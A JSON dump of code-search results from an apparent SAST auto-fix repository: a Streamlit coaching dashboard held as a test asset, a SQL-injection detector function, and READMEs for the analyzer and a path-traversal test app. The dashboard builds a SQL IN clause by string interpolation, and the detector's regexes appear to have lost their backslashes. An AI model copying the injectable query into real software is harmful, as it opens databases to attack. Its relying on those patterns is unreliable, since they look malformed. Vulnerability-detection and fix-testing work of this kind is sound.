session_note[10],","lineNumber":102},{"text":"                        \\"coaching_plan_id\\": session_note[0],","lineNumber":103},{"text":"                        \\"coaching_plan_url\\": build_coaching_plan_url(customer, session_note[8], session_note[0]),","lineNumber":104},{"text":"                        \\"creator_user_name\\": session_note[1],","lineNumber":105},{"text":"                        \\"creator_user_id\\": session_note[2],","lineNumber":106},{"text":"                        \\"submitter_user_name\\": session_note[3],","lineNumber":107},{"text":"                        \\"submitter_user_id\\": session_note[4],","lineNumber":108},{"text":"                        \\"session_time\\": session_note[5],","lineNumber":109},{"text":"                        \\"focus_criteria_template_id\\": ids[0],","lineNumber":110},{"text":"                        \\"focus_criteria_id\\": ids[1],","lineNumber":111},{"text":"                        \\"agent_user_name\\": session_note[7],","lineNumber":112},{"text":"                        \\"agent_user_id\\": session_note[8],","lineNumber":113},{"text":"                        \\"before_score\\": -1,","lineNumber":114},{"text":"                        \\"before_convo_count\\": 0,","lineNumber":115},{"text":"                        \\"after_score\\": -1,","lineNumber":116},{"text":"                        \\"after_convo_count\\": 0,","lineNumber":117},{"text":"                    })","lineNumber":118},{"text":"            else:","lineNumber":119},{"text":"                coaching_sessions.append({","lineNumber":120},{"text":"                    \\"session_id\\": session_note[9],","lineNumber":121},{"text":"                    \\"coaching_plan_id\\": session_note[0],","lineNumber":122},{"text":"                    \\"coaching_plan_url\\": build_coaching_plan_url(customer, session_note[8], session_note[0]),","lineNumber":123},{"text":"                    \\"creator_user_name\\": session_note[1],","lineNumber":124},{"text":"                    \\"creator_user_id\\": session_note[2],","lineNumber":125},{"text":"                    \\"submitter_user_name\\": session_note[3],","lineNumber":126},{"text":"                    \\"submitter_user_id\\": session_note[4],","lineNumber":127},{"text":"                    \\"session_time\\": session_note[5],","lineNumber":128},{"text":"                    \\"focus_criteria_template_id\\": '',","lineNumber":129},{"text":"                    \\"focus_criteria_id\\": '',","lineNumber":130},{"text":"                    \\"agent_user_name\\": session_note[7],","lineNumber":131},{"text":"                    \\"agent_user_id\\": session_note[8],","lineNumber":132},{"text":"                    \\"before_score\\": -1,","lineNumber":133},{"text":"                    \\"before_convo_count\\": 0,","lineNumber":134},{"text":"                    \\"after_score\\": -1,","lineNumber":135},{"text":"                    \\"after_convo_count\\": 0,","lineNumber":136},{"text":"                })","lineNumber":137},{"text":"            user_id_name[session_note[2]] = session_note[1]","lineNumber":138},{"text":"            user_id_name[session_note[4]] = session_note[3]","lineNumber":139},{"text":"            user_id_name[session_note[8]] = session_note[7]","lineNumber":140},{"lineNumber":141},{"text":"    if len(scorecard_template_id_name_map) == 0:","lineNumber":142},{"text":"        return coaching_sessions","lineNumber":143},{"lineNumber":144},{"text":"    with conn.cursor() as cursor:","lineNumber":145},{"text":"        cursor.execute(f\\"\\"\\"","lineNumber":146},{"text":"            SELECT","lineNumber":147},{"text":"                resource_id as scorecard_template_id,","lineNumber":148},{"text":"                title as title,","lineNumber":149},{"text":"                template as template","lineNumber":150},{"text":"            FROM director.scorecard_templates ","lineNumber":151},{"text":"            WHERE resource_id IN ('{\\"','\\".join(scorecard_template_id_name_map.keys())}')","lineNumber":152},{"text":"            \\"\\"\\")","lineNumber":153},{"text":"        ","lineNumber":154},{"text":"        rows = cursor.fetchall()","lineNumber":155},{"text":"        for template in rows:","lineNumber":156},{"text":"            scorecard_template_id_name_map[template[0]] = template[1]","lineNumber":157},{"text":"            for items in template[2].get('items', []):","lineNumber":158},{"text":"                if 'identifier' in items and 'displayName' in items:","lineNumber":159},{"text":"                    template_criteria_id_name_map[items['identifier']] = items['displayName']","lineNumber":160},{"text":"                if 'items' in items:","lineNumber":161},{"text":"                    for criteria_items in items['items']:","lineNumber":162},{"text":"                        if 'identifier' in criteria_items and 'displayName' in criteria_items:","lineNumber":163},{"text":"                            template_criteria_id_name_map[criteria_items['identifier']] = criteria_items['displayName']","lineNumber":164},{"lineNumber":165},{"text":"        for session in coaching_sessions:","lineNumber":166},{"text":"            if session['focus_criteria_template_id'] != '':","lineNumber":167},{"text":"                session['focus_criteria_template'] = scorecard_template_id_name_map[session['focus_criteria_template_id']]","lineNumber":168},{"text":"            if session['focus_criteria_id'] != '' and session['focus_criteria_id'] in template_criteria_id_name_map:","lineNumber":169},{"text":"                session['focus_criteria'] = template_criteria_id_name_map[session['focus_criteria_id']]","lineNumber":170},{"text":"        ","lineNumber":171},{"text":"    return coaching_sessions","lineNumber":172},{"lineNumber":173},{"lineNumber":174},{"text":"def load_scores_data(customer_display_name, coaching_sessions, num_days):","lineNumber":175},{"text":"    if not coaching_sessions:","lineNumber":176},{"text":"        return None","lineNumber":177},{"lineNumber":178},{"text":"    customer = next(c for c in all_customers if c['display_name'] == customer_display_name)","lineNumber":179},{"lineNumber":180},{"text":"    progress = st.progress(0, text=\\"Computing the coaching efficiency of the session notes...\\")","lineNumber":181},{"lineNumber":182},{"text":"    port_number, port_forward_process = port_forward_ports_and_processes[customer['prod_env_name']]","lineNumber":183},{"text":"    if port_forward_process is None or port_forward_process.poll() is not None:","lineNumber":184},{"text":"        process = subprocess.Popen([","lineNumber":185},{"text":"            'kubectl',","lineNumber":186},{"text":"            f'--context={customer[\\"prod_env_name\\"]}',","lineNumber":187},{"text":"            '--namespace=cresta-api',","lineNumber":188},{"text":"            'port-forward',","lineNumber":189},{"text":"            'services/insights-server',","lineNumber":190},{"text":"            f'{port_number}:80',","lineNumber":191},{"text":"        ])","lineNumber":192},{"text":"        port_forward_ports_and_processes[customer['prod_env_name']] = (port_number, process)","lineNumber":193},{"text":"        time.sleep(2)","lineNumber":194},{"lineNumber":195},{"text":"    api_key = os.environ.get('INSIGHTS_SERVER_API_KEY')","lineNumber":196},{"text":"    assert api_key, 'INSIGHTS_SERVER_API_KEY must be set'","lineNumber":197},{"text":"    auth_metadata = [['authorization', f'ApiKey {api_key}']]","lineNumber":198},{"lineNumber":199},{"text":"    with grpc.insecure_channel(","lineNumber":200},{"text":"            f'localhost:{port_number}',","lineNumber":201},{"text":"            options=[","lineNumber":202},{"text":"                ('grpc.max_receive_message_length', 50000000),","lineNumber":203},{"text":"            ],","lineNumber":204},{"text":"    ) as channel:","lineNumber":205},{"text":"        stub = analytics_service_pb2_grpc.AnalyticsServiceStub(channel)","lineNumber":206},{"text":"        for coaching_session_idx in range(len(coaching_sessions)):","lineNumber":207},{"text":"            progress.progress(coaching_session_idx / len(coaching_sessions), text=\\"Computing the coaching efficiency of the session notes...\\")","lineNumber":208},{"text":"            coaching_session = coaching_sessions[coaching_session_idx]","lineNumber":209},{"text":"            if coaching_session['focus_criteria_id'] != '':","lineNumber":210},{"text":"                before_score, before_convo_count = query_agent_criteria_score(","lineNumber":211},{"text":"                    stub, customer, auth_metadata, coaching_session['agent_user_id'], coaching_session['focus_criteria_id'], coaching_session['session_time'] - datetime.timedelta(days=num_days), coaching_session['session_time'])","lineNumber":212},{"text":"                after_score, after_convo_count = query_agent_criteria_score(","lineNumber":213},{"text":"                    stub, customer, auth_metadata, coaching_session['agent_user_id'], coaching_session['focus_criteria_id'], coaching_session['session_time'], coaching_session['session_time'] + datetime.timedelta(days=num_days))","lineNumber":214},{"text":"                coaching_session['before_score'] = before_score","lineNumber":215},{"text":"                coaching_session['before_convo_count'] = before_convo_count","lineNumber":216},{"text":"                coaching_session['after_score'] = after_score","lineNumber":217},{"text":"                coaching_session['after_convo_count'] = after_convo_count","lineNumber":218},{"lineNumber":219},{"text":"    progress.empty()","lineNumber":220},{"text":"    return coaching_sessions","lineNumber":221},{"lineNumber":222},{"text":"@st.cache_data","lineNumber":223},{"text":"def query_agent_criteria_score(_stub, customer, auth_metadata, agent_user_id, criteria_id, start_time, end_time):","lineNumber":224},{"text":"    parent = f'customers/{customer[\\"customer_id\\"]}/profiles/{customer[\\"profile_id\\"]}'","lineNumber":225},{"text":"    agent_user_name = f'customers/{customer[\\"customer_id\\"]}/users/{agent_user_id}'","lineNumber":226},{"text":"    try:","lineNumber":227},{"text":"        request = analytics_service_pb2.RetrieveQAScoreStatsRequest(","lineNumber":228},{"text":"            parent=parent,","lineNumber":229},{"text":"            read_from_clickhouse=True,","lineNumber":230},{"text":"            filter_by_time_range=common_pb2.TimeRange(","lineNumber":231},{"text":"                start_timestamp=timestamp_pb2.Timestamp(seconds=int(start_time.timestamp()), ),","lineNumber":232},{"text":"                end_timestamp=timestamp_pb2.Timestamp(seconds=int(end_time.timestamp()), ),","lineNumber":233},{"text":"            ),","lineNumber":234},{"text":"            filter_by_attribute=qa_stats_pb2.QAAttribute(","lineNumber":235},{"text":"                    users=[user_pb2.User(name=agent_user_name)],","lineNumber":236},{"text":"                    criterion_identifiers=[criteria_id],","lineNumber":237},{"text":"                ),","lineNumber":238},{"text":"            group_by_attribute_types=[","lineNumber":239},{"text":"                qa_stats_pb2.QAAttributeType.QA_ATTRIBUTE_TYPE_CRITERION,","lineNumber":240},{"text":"            ],","lineNumber":241},{"text":"        )","lineNumber":242},{"text":"        response = _stub.RetrieveQAScoreStats(","lineNumber":243},{"text":"            request,","lineNumber":244},{"text":"            metadata=auth_metadata,","lineNumber":245},{"text":"            timeout=600)","lineNumber":246},{"text":"    except Exception as e:","lineNumber":247},{"text":"        print(f'Error querying Insights Server: {e}')","lineNumber":248},{"text":"        return None","lineNumber":249},{"text":"    if response.qa_score_result.total_conversation_count == 0:","lineNumber":250},{"text":"        return -1, 0","lineNumber":251},{"text":"    return response.qa_score_result.average_qa_score, response.qa_score_result.total_conversation_count","lineNumber":252},{"lineNumber":253},{"lineNumber":254},{"text":"##############################################################################################","lineNumber":255},{"lineNumber":256},{"text":"customer_display_name = st.selectbox(","lineNumber":257},{"text":"    'Select a customer:',","lineNumber":258},{"text":"    [c['display_name'] for c in all_customers])","lineNumber":259},{"lineNumber":260},{"text":"num_last_days = st.number_input(\\"How many days back to load the session notes?\\", min_value=7, max_value=180, value=30, step=1)","lineNumber":261},{"lineNumber":262},{"text":"num_days = st.number_input(\\"How many days to measure the session efficiency?\\", min_value=1, max_value=30, value=7, step=1)","lineNumber":263},{"lineNumber":264},{"text":"coaching_sessions = load_coaching_data(customer_display_name, num_last_days, num_days)","lineNumber":265},{"lineNumber":266},{"text":"coaching_sessions = load_scores_data(customer_display_name, coaching_sessions, num_days)","lineNumber":267},{"lineNumber":268},{"text":"with st.expander(\\"All loaded session notes\\", expanded=True):","lineNumber":269},{"text":"    st.write(f\\"Loaded {len(coaching_sessions)} coaching sessions in total\\")","lineNumber":270},{"text":"    session_df = pd.DataFrame(coaching_sessions)","lineNumber":271},{"text":"    st.dataframe(session_df)","lineNumber":272},{"text":"    st.write(f\\"Loaded {len(session_df['session_id'].unique())} coaching sessions in { len(session_df['coaching_plan_id'].unique()) } coaching plans.\\")","lineNumber":273},{"text":"    # session_df.to_csv('coaching_sessions.csv', index=False)  # Set index=False to omit row numbers","lineNumber":274},{"lineNumber":275},{"text":"with st.expander(\\"Session notes with valid scores\\", expanded=True):","lineNumber":276},{"text":"    # Coach efficiency chart.","lineNumber":277},{"text":"    valid_session_df = session_df[(session_df['before_score'] >= 0) & (session_df['after_score'] >= 0)].reset_index()","lineNumber":278},{"text":"    st.dataframe(valid_session_df)","lineNumber":279},{"text":" ","lineNumber":280},{"text":"    session_with_criteria_df = session_df[session_df['focus_criteria_id'] != '']","lineNumber":281},{"text":"    st.write(f\\"Loaded {len(session_with_criteria_df['session_id'].unique())} coaching sessions with focus criteria in the coaching plan.\\")","lineNumber":282},{"text":"    st.write(f\\"Loaded {len(valid_session_df['session_id'].unique())} coaching sessions with valid performance scores computed.\\")","lineNumber":283},{"lineNumber":284},{"text":"def weighted_effiency(df):","lineNumber":285},{"text":"    efficiency = ((df['after_score'] - df['before_score']) * df['after_convo_count']).sum() / df['after_convo_count'].sum()","lineNumber":286},{"text":"    num_sessions =  len(df['session_id'].unique())","lineNumber":287},{"text":"    return pd.Series({","lineNumber":288},{"text":"        'efficiency': efficiency,","lineNumber":289},{"text":"        'num_sessions': num_sessions","lineNumber":290},{"text":"    })","lineNumber":291},{"lineNumber":292},{"text":"with st.expander(\\"Session efficiency\\", expanded=True):","lineNumber":293},{"text":"    session_efficiency_df = valid_session_df.groupby('session_id').apply(weighted_effiency).reset_index()","lineNumber":294},{"text":"    session_efficiency_df.columns = ['Session id', 'Efficiency', 'Number of Sessions']","lineNumber":295},{"text":"    st.dataframe(session_efficiency_df)","lineNumber":296},{"text":"    fig = px.histogram(session_efficiency_df, x=\\"Efficiency\\", nbins=100)","lineNumber":297},{"text":"    st.plotly_chart(fig, theme=\\"streamlit\\")","lineNumber":298},{"lineNumber":299},{"text":"with st.expander(\\"Coaching plan efficiency\\", expanded=True):","lineNumber":300},{"text":"    plan_efficiency_df = valid_session_df.groupby('coaching_plan_id').apply(weighted_effiency).reset_index()","lineNumber":301},{"text":"    plan_efficiency_df.columns = ['Coach Plan', 'Efficiency', 'Number of Sessions']","lineNumber":302},{"text":"    st.dataframe(plan_efficiency_df)","lineNumber":303},{"text":"    fig = px.histogram(plan_efficiency_df, x=\\"Efficiency\\", nbins=100)","lineNumber":304},{"text":"    st.plotly_chart(fig, theme=\\"streamlit\\")","lineNumber":305},{"lineNumber":306},{"text":"with st.expander(\\"Focus criteria efficiency\\", expanded=True):","lineNumber":307},{"text":"    criteria_efficiency_df = valid_session_df.groupby('focus_criteria').apply(weighted_effiency).reset_index()","lineNumber":308},{"text":"    criteria_efficiency_df.columns = ['Focus Criteria', 'Efficiency', 'Number of Sessions']","lineNumber":309},{"text":"    st.dataframe(criteria_efficiency_df)","lineNumber":310},{"text":"    fig = px.histogram(criteria_efficiency_df, x=\\"Efficiency\\", nbins=100)","lineNumber":311},{"text":"    st.plotly_chart(fig, theme=\\"streamlit\\")","lineNumber":312},{"lineNumber":313},{"text":"with st.expander(\\"Focus scorecard template efficiency\\", expanded=True):","lineNumber":314},{"text":"    template_efficiency_df = valid_session_df.groupby('focus_criteria_template').apply(weighted_effiency).reset_index()","lineNumber":315},{"text":"    template_efficiency_df.columns = ['Focus Scorecard Template', 'Efficiency', 'Number of Sessions']","lineNumber":316},{"text":"    st.dataframe(template_efficiency_df)","lineNumber":317},{"text":"    fig = px.histogram(template_efficiency_df, x=\\"Efficiency\\", nbins=100)","lineNumber":318},{"text":"    st.plotly_chart(fig, theme=\\"streamlit\\")","lineNumber":319},{"lineNumber":320},{"text":"with st.expander(\\"Coach efficiency\\", expanded=True):","lineNumber":321},{"text":"    coach_efficiency_df = valid_session_df.groupby('creator_user_name').apply(weighted_effiency).reset_index()","lineNumber":322},{"text":"    coach_efficiency_df.columns = ['Coach', 'Efficiency', 'Number of Sessions']","lineNumber":323},{"text":"    st.dataframe(coach_efficiency_df)","lineNumber":324},{"text":"    st.scatter_chart(data=coach_efficiency_df, x='Number of Sessions', y='Efficiency', size='Number of Sessions')","lineNumber":325},{"lineNumber":326},{"text":"with st.expander(\\"Agent efficiency\\", expanded=True):","lineNumber":327},{"text":"    # Agent efficiency chart.","lineNumber":328},{"text":"    agent_efficiency_df = valid_session_df.groupby('agent_user_name').apply(weighted_effiency).reset_index()","lineNumber":329},{"text":"    agent_efficiency_df.columns = ['Agent', 'Efficiency', 'Number of Sessions']","lineNumber":330},{"text":"    st.dataframe(agent_efficiency_df)","lineNumber":331},{"text":"    st.scatter_chart(data=agent_efficiency_df, x='Number of Sessions', y='Efficiency', size='Number of Sessions')","lineNumber":332},{"text":"\`","lineNumber":333},{"lineNumber":334},{"lineNumber":335},{"text":"export const processingFunction = \`","lineNumber":336},{"text":"function analyzeCodeForSQLInjection(code) {","lineNumber":337},{"text":"  // Regular expressions to detect SQL Injection vulnerabilities","lineNumber":338},{"text":"  const patterns = [","lineNumber":339},{"text":"    /\\b(executeQuery|executeUpdate)s*(s*.*+.*)/i,","lineNumber":340},{"text":"    /\\bStatements+.*=s+.*.createStatement()/i,","lineNumber":341},{"text":"    /[\\"']s*+s*w+s*+s*[\\"']/i","lineNumber":342},{"text":"  ];","lineNumber":343},{"lineNumber":344},{"text":"  // Check if code matches any vulnerable patterns","lineNumber":345},{"text":"  const vulnerabilities = patterns.reduce((issues, pattern) => {","lineNumber":346},{"text":"    if (pattern.test(code)) {","lineNumber":347},{"text":"      issues.push({","lineNumber":348},{"text":"        type: \\"SQL Injection\\",","lineNumber":349},{"text":"        severity: calculateSeverity(code),","lineNumber":350},{"text":"        location: findVulnerableLocation(code, pattern)","lineNumber":351},{"text":"      });","lineNumber":352},{"text":"    }","lineNumber":353},{"text":"    return issues;","lineNumber":354},{"text":"  }, []);","lineNumber":355},{"lineNumber":356},{"text":"  return {","lineNumber":357},{"text":"    issues: vulnerabilities,","lineNumber":358},{"text":"    summary: generateSummary(vulnerabilities),","lineNumber":359},{"text":"    hasCritical: vulnerabilities.some(v => v.severity === \\"Critical\\")","lineNumber":360},{"text":"  };","lineNumber":361},{"text":"}","lineNumber":362},{"text":"\`;","lineNumber":363}]},"score":0.29074323177337646},{"codeBlock":{"relativeWorkspacePath":"consumers/analyzer/README.md","range":{"startPosition":{},"endPosition":{"line":45}},"contents":"# Analyzer\\n\\nAnalyzer is the main Mobb component responsible for matching SAST vulnerabilities and customer source code and producing the fixes.\\n\\n## Useful commands\\n\\n- \`make test\` or \`make test-watch\` to run all test.\\n- \`make test-snapshot\` to update snapshots for all tests after code changes. Please review snapshots before committing changes.\\n- \`make codestyle\` to ensure code formatting. It is required before committing changes.\\n- \`poetry run python analyzer/start_analyzer.py\` to run the analyzer locally (outside of Docker environment). RabbitMQ required.\\n\\n## \`analyzer/fixes\` folder structure\\n\\nAll logic is stored in the nested folder structure: language (e.g., java/js/csharp) -> vulnerability type (e.g., pt/cmdi/xss).\\n\\nIn each folder, we have several files. They are loaded dynamically. Hence, names should be preserved.\\n\\n### \`types.py\`\\n\\nThis file contains dataclasses, which are used to communicate between \`analyzer.py\`, \`parser.py\`, and \`fixer.py\`.\\n\\nIt usually defines the child class of the \`FixInfo\` class, which is eventually stored as a Pickle file in S3 and used by \`interactive_fixer\` to produce a fix.\\n\\nThe \`FixInfo\` may optionally define \`get_questions\` function, which is responsible for the fix questions presented to the user.\\n\\n### \`parser.py\`\\n\\n\`parser.py\` is responsible for parsing customer source code and extracting information used later in \`analyzer.py\`.\\n\\nThis is the only place where AST manipulation is allowed. E.g., we can use \`execute_semgrep\` and \`execute_treesitter\` only in this file.\\n\\n### \`treesitter_rules\` folder\\n\\nThis folder contains \`lisp\` rule files. They are used by Tree-sitter to extract specific AST nodes.\\n\\nThe rule file name should be unique and in the shape of: \`meaning.language.lisp\` (for example, \`get_java_comments.java.lisp\`).\\n\\nUseful links:\\n\\n- Rules playground: https://tree-sitter.github.io/tree-sitter/playground\\n- Documentation: https://tree-sitter.github.io/tree-sitter/using-parsers#query-syntax\\n\\n### \`semgrep_rules\` folder\\n\\n","originalContents":"# Analyzer\\n\\nAnalyzer is the main Mobb component responsible for matching SAST vulnerabilities and customer source code and producing the fixes.\\n\\n## Useful commands\\n\\n- \`make test\` or \`make test-watch\` to run all test.\\n- \`make test-snapshot\` to update snapshots for all tests after code changes. Please review snapshots before committing changes.\\n- \`make codestyle\` to ensure code formatting. It is required before committing changes.\\n- \`poetry run python analyzer/start_analyzer.py\` to run the analyzer locally (outside of Docker environment). RabbitMQ required.\\n\\n## \`analyzer/fixes\` folder structure\\n\\nAll logic is stored in the nested folder structure: language (e.g., java/js/csharp) -> vulnerability type (e.g., pt/cmdi/xss).\\n\\nIn each folder, we have several files. They are loaded dynamically. Hence, names should be preserved.\\n\\n### \`types.py\`\\n\\nThis file contains dataclasses, which are used to communicate between \`analyzer.py\`, \`parser.py\`, and \`fixer.py\`.\\n\\nIt usually defines the child class of the \`FixInfo\` class, which is eventually stored as a Pickle file in S3 and used by \`interactive_fixer\` to produce a fix.\\n\\nThe \`FixInfo\` may optionally define \`get_questions\` function, which is responsible for the fix questions presented to the user.\\n\\n### \`parser.py\`\\n\\n\`parser.py\` is responsible for parsing customer source code and extracting information used later in \`analyzer.py\`.\\n\\nThis is the only place where AST manipulation is allowed. E.g., we can use \`execute_semgrep\` and \`execute_treesitter\` only in this file.\\n\\n### \`treesitter_rules\` folder\\n\\nThis folder contains \`lisp\` rule files. They are used by Tree-sitter to extract specific AST nodes.\\n\\nThe rule file name should be unique and in the shape of: \`meaning.language.lisp\` (for example, \`get_java_comments.java.lisp\`).\\n\\nUseful links:\\n\\n- Rules playground: https://tree-sitter.github.io/tree-sitter/playground\\n- Documentation: https://tree-sitter.github.io/tree-sitter/using-parsers#query-syntax\\n\\n### \`semgrep_rules\` folder\\n\\n","detailedLines":[{"text":"# Analyzer","lineNumber":1},{"lineNumber":2},{"text":"Analyzer is the main Mobb component responsible for matching SAST vulnerabilities and customer source code and producing the fixes.","lineNumber":3},{"lineNumber":4},{"text":"## Useful commands","lineNumber":5},{"lineNumber":6},{"text":"- \`make test\` or \`make test-watch\` to run all test.","lineNumber":7},{"text":"- \`make test-snapshot\` to update snapshots for all tests after code changes. Please review snapshots before committing changes.","lineNumber":8},{"text":"- \`make codestyle\` to ensure code formatting. It is required before committing changes.","lineNumber":9},{"text":"- \`poetry run python analyzer/start_analyzer.py\` to run the analyzer locally (outside of Docker environment). RabbitMQ required.","lineNumber":10},{"lineNumber":11},{"text":"## \`analyzer/fixes\` folder structure","lineNumber":12},{"lineNumber":13},{"text":"All logic is stored in the nested folder structure: language (e.g., java/js/csharp) -> vulnerability type (e.g., pt/cmdi/xss).","lineNumber":14},{"lineNumber":15},{"text":"In each folder, we have several files. They are loaded dynamically. Hence, names should be preserved.","lineNumber":16},{"lineNumber":17},{"text":"### \`types.py\`","lineNumber":18},{"lineNumber":19},{"text":"This file contains dataclasses, which are used to communicate between \`analyzer.py\`, \`parser.py\`, and \`fixer.py\`.","lineNumber":20},{"lineNumber":21},{"text":"It usually defines the child class of the \`FixInfo\` class, which is eventually stored as a Pickle file in S3 and used by \`interactive_fixer\` to produce a fix.","lineNumber":22},{"lineNumber":23},{"text":"The \`FixInfo\` may optionally define \`get_questions\` function, which is responsible for the fix questions presented to the user.","lineNumber":24},{"lineNumber":25},{"text":"### \`parser.py\`","lineNumber":26},{"lineNumber":27},{"text":"\`parser.py\` is responsible for parsing customer source code and extracting information used later in \`analyzer.py\`.","lineNumber":28},{"lineNumber":29},{"text":"This is the only place where AST manipulation is allowed. E.g., we can use \`execute_semgrep\` and \`execute_treesitter\` only in this file.","lineNumber":30},{"lineNumber":31},{"text":"### \`treesitter_rules\` folder","lineNumber":32},{"lineNumber":33},{"text":"This folder contains \`lisp\` rule files. They are used by Tree-sitter to extract specific AST nodes.","lineNumber":34},{"lineNumber":35},{"text":"The rule file name should be unique and in the shape of: \`meaning.language.lisp\` (for example, \`get_java_comments.java.lisp\`).","lineNumber":36},{"lineNumber":37},{"text":"Useful links:","lineNumber":38},{"lineNumber":39},{"text":"- Rules playground: https://tree-sitter.github.io/tree-sitter/playground","lineNumber":40},{"text":"- Documentation: https://tree-sitter.github.io/tree-sitter/using-parsers#query-syntax","lineNumber":41},{"lineNumber":42},{"text":"### \`semgrep_rules\` folder","lineNumber":43},{"lineNumber":44},{"text":"Contains \`yml\` rules used by Semgrep. The rule file name should be unique.","lineNumber":45}]},"score":0.2902885973453522},{"codeBlock":{"relativeWorkspacePath":"consumers/analyzer/tests/assets/java/pt/e-1488/source/README.md","range":{"startPosition":{"line":76},"endPosition":{"line":160}},"contents":"- **Response**: JSON with file metadata (size, last modified)\\n\\n**Example using curl:**\\n\`\`\`bash\\ncurl \\"http://localhost:8080/api/files/info?filename={filename}\\"\\n\`\`\`\\n\\n## Configuration\\n\\nThe application can be configured through \`src/main/resources/application.properties\`:\\n\\n- \`server.port\`: Server port (default: 8080)\\n- \`spring.servlet.multipart.max-file-size\`: Maximum file size (default: 10MB)\\n- \`spring.servlet.multipart.max-request-size\`: Maximum request size (default: 10MB)\\n\\n## File Storage\\n\\nFiles are stored in the \`uploads/\` directory in the application's working directory. Each file is given a unique UUID-based filename to prevent conflicts.\\n\\n## Security Considerations\\n\\nThis is a simple demo application. For production use, consider implementing:\\n\\n- Authentication and authorization\\n- File type validation\\n- Virus scanning\\n- Rate limiting\\n- Secure file storage (e.g., cloud storage)\\n- Input validation and sanitization\\n\\n## Error Handling\\n\\nThe API returns appropriate HTTP status codes:\\n\\n- \`200 OK\`: Successful operation\\n- \`400 Bad Request\`: Invalid input or file not found\\n- \`404 Not Found\`: File not found\\n- \`500 Internal Server Error\`: Server error\\n\\n## Development\\n\\n### Project Structure\\n\\n\`\`\`\\nsrc/\\n├── main/\\n│   ├── java/\\n│   │   └── com/example/fileapi/\\n│   │       ├── FileApiApplication.java\\n│   │       ├── controller/\\n│   │       │   └── FileController.java\\n│   │       └── service/\\n│   │           └── FileService.java\\n│   └── resources/\\n│       ├── application.properties\\n│       └── static/\\n│           └── index.html\\n└── test/\\n    └── java/\\n        └── com/example/fileapi/\\n            └── FileApiApplicationTests.java\\n\`\`\`\\n\\n### Running Tests\\n\\n\`\`\`bash\\nmvn test\\n\`\`\`\\n\\n### Building JAR\\n\\n\`\`\`bash\\nmvn clean package\\n\`\`\`\\n\\nThe executable JAR will be created in the \`target/\` directory.\\n\\n## License\\n\\n","originalContents":"- **Response**: JSON with file metadata (size, last modified)\\n\\n**Example using curl:**\\n\`\`\`bash\\ncurl \\"http://localhost:8080/api/files/info?filename={filename}\\"\\n\`\`\`\\n\\n## Configuration\\n\\nThe application can be configured through \`src/main/resources/application.properties\`:\\n\\n- \`server.port\`: Server port (default: 8080)\\n- \`spring.servlet.multipart.max-file-size\`: Maximum file size (default: 10MB)\\n- \`spring.servlet.multipart.max-request-size\`: Maximum request size (default: 10MB)\\n\\n## File Storage\\n\\nFiles are stored in the \`uploads/\` directory in the application's working directory. Each file is given a unique UUID-based filename to prevent conflicts.\\n\\n## Security Considerations\\n\\nThis is a simple demo application. For production use, consider implementing:\\n\\n- Authentication and authorization\\n- File type validation\\n- Virus scanning\\n- Rate limiting\\n- Secure file storage (e.g., cloud storage)\\n- Input validation and sanitization\\n\\n## Error Handling\\n\\nThe API returns appropriate HTTP status codes:\\n\\n- \`200 OK\`: Successful operation\\n- \`400 Bad Request\`: Invalid input or file not found\\n- \`404 Not Found\`: File not found\\n- \`500 Internal Server Error\`: Server error\\n\\n## Development\\n\\n### Project Structure\\n\\n\`\`\`\\nsrc/\\n├── main/\\n│   ├── java/\\n│   │   └── com/example/fileapi/\\n│   │       ├── FileApiApplication.java\\n│   │       ├── controller/\\n│   │       │   └── FileController.java\\n│   │       └── service/\\n│   │           └── FileService.java\\n│   └── resources/\\n│       ├── application.properties\\n│       └── static/\\n│           └── index.html\\n└── test/\\n    └── java/\\n        └── com/example/fileapi/\\n            └── FileApiApplicationTests.java\\n\`\`\`\\n\\n### Running Tests\\n\\n\`\`\`bash\\nmvn test\\n\`\`\`\\n\\n### Building JAR\\n\\n\`\`\`bash\\nmvn clean package\\n\`\`\`\\n\\nThe executable JAR will be created in the \`target/\` directory.\\n\\n## License\\n\\n","detailedLines":[{"text":"\`\`\`","lineNumber":77},{"lineNumber":78},{"text":"### Get File Information","lineNumber":79},{"text":"- **URL**: \`GET /api/files/info?filename={filename}\`","lineNumber":80},{"text":"- **Response**: JSON with file metadata (size, last modified)","lineNumber":81},{"lineNumber":82},{"text":"**Example using curl:**","lineNumber":83},{"text":"\`\`\`bash","lineNumber":84},{"text":"curl \\"http://localhost:8080/api/files/info?filename={filename}\\"","lineNumber":85},{"text":"\`\`\`","lineNumber":86},{"lineNumber":87},{"text":"## Configuration","lineNumber":88},{"lineNumber":89},{"text":"The application can be configured through \`src/main/resources/application.properties\`:","lineNumber":90},{"lineNumber":91},{"text":"- \`server.port\`: Server port (default: 8080)","lineNumber":92},{"text":"- \`spring.servlet.multipart.max-file-size\`: Maximum file size (default: 10MB)","lineNumber":93},{"text":"- \`spring.servlet.multipart.max-request-size\`: Maximum request size (default: 10MB)","lineNumber":94},{"lineNumber":95},{"text":"## File Storage","lineNumber":96},{"lineNumber":97},{"text":"Files are stored in the \`uploads/\` directory in the application's working directory. Each file is given a unique UUID-based filename to prevent conflicts.","lineNumber":98},{"lineNumber":99},{"text":"## Security Considerations","lineNumber":100},{"lineNumber":101},{"text":"This is a simple demo application. For production use, consider implementing:","lineNumber":102},{"lineNumber":103},{"text":"- Authentication and authorization","lineNumber":104},{"text":"- File type validation","lineNumber":105},{"text":"- Virus scanning","lineNumber":106},{"text":"- Rate limiting","lineNumber":107},{"text":"- Secure file storage (e.g., cloud storage)","lineNumber":108},{"text":"- Input validation and sanitization","lineNumber":109},{"lineNumber":110},{"text":"## Error Handling","lineNumber":111},{"lineNumber":112},{"text":"The API returns appropriate HTTP status codes:","lineNumber":113},{"lineNumber":114},{"text":"- \`200 OK\`: Successful operation","lineNumber":115},{"text":"- \`400 Bad Request\`: Invalid input or file not found","lineNumber":116},{"text":"- \`404 Not Found\`: File not found","lineNumber":117},{"text":"- \`500 Internal Server Error\`: Server error","lineNumber":118},{"lineNumber":119},{"text":"## Development","lineNumber":120},{"lineNumber":121},{"text":"### Project Structure","lineNumber":122},{"lineNumber":123},{"text":"\`\`\`","lineNumber":124},{"text":"src/","lineNumber":125},{"text":"├── main/","lineNumber":126},{"text":"│   ├── java/","lineNumber":127},{"text":"│   │   └── com/example/fileapi/","lineNumber":128},{"text":"│   │       ├── FileApiApplication.java","lineNumber":129},{"text":"│   │       ├── controller/","lineNumber":130},{"text":"│   │       │   └── FileController.java","lineNumber":131},{"text":"│   │       └── service/","lineNumber":132},{"text":"│   │           └── FileService.java","lineNumber":133},{"text":"│   └── resources/","lineNumber":134},{"text":"│       ├── application.properties","lineNumber":135},{"text":"│       └── static/","lineNumber":136},{"text":"│           └── 